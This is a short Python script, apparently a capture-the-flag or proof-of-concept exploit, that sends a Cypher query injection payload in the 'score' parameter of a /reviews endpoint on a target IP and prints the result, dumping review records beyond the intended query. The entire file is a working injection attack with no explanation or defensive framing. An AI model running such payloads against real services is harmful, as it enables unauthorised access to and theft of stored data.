#!/usr/bin/env python3

import sys
import requests

ip = sys.argv[1]

payload = '3 RETURN r LIMIT 1 UNION ALL MATCH (r:Review)'
host = f'http://{ip}:4000/reviews'

resp = requests.get(host, params={'score': payload})

print(resp.text, flush=True)



